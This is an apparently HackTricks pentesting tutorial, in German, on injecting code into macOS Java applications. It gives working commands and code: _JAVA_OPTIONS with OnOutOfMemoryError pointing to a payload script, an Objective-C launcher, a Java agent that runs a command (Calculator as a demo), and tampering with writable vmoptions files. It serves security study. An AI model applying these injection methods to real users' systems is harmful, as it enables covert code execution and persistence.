# Injection in macOS-Java-Anwendungen

{{#include ../../../banners/hacktricks-training.md}}

## Enumeration

Finde die auf deinem System installierten Java-Anwendungen. Es wurde festgestellt, dass Java-Anwendungen in der **Info.plist** einige Java-Parameter enthalten, die den String **`java.`** enthalten. Daher kannst du danach suchen:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

Die Umgebungsvariable **`_JAVA_OPTIONS`** kann verwendet werden, um bei der Ausführung einer kompilierten Java-App beliebige Java-Parameter einzuschleusen:
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Um es als neuen Prozess und nicht als Kindprozess des aktuellen Terminals auszuführen, können Sie Folgendes verwenden:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Dies löst jedoch einen Fehler in der ausgeführten App aus. Eine weitere, unauffälligere Methode besteht darin, einen Java-Agenten zu erstellen und Folgendes zu verwenden:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
> [!CAUTION]
> Das Erstellen des Agents mit einer **anderen Java-Version** als der Anwendung kann die Ausführung sowohl des Agents als auch der Anwendung zum Absturz bringen.

Der Agent kann sich dabei befinden:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Um den Agent zu kompilieren, führe Folgendes aus:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Mit `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Und dann exportieren Sie die Umgebungsvariable und führen die Java-Anwendung wie folgt aus:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions-Datei

Diese Datei unterstützt die Angabe von **Java params**, wenn Java ausgeführt wird. Du könntest einige der vorherigen Tricks verwenden, um die Java params zu ändern und den **Prozess beliebige Befehle ausführen zu lassen**.\
Außerdem kann diese Datei mit dem Verzeichnis `include` auch **andere Dateien einbinden**, sodass du ebenfalls eine eingebundene Datei ändern könntest.

Darüber hinaus werden von einigen Java-Apps **mehr als eine `vmoptions`**-Datei geladen.

Einige Anwendungen wie Android Studio geben in ihrer **Ausgabe an, wo sie nach** diesen Dateien suchen, zum Beispiel:
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Falls nicht, können Sie dies einfach überprüfen mit:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Beachte, wie interessant es ist, dass Android Studio in diesem Beispiel versucht, die Datei **`/Applications/Android Studio.app.vmoptions`** zu laden – ein Ort, an dem jeder Benutzer aus der **`admin`-Gruppe Schreibzugriff hat.**

{{#include ../../../banners/hacktricks-training.md}}
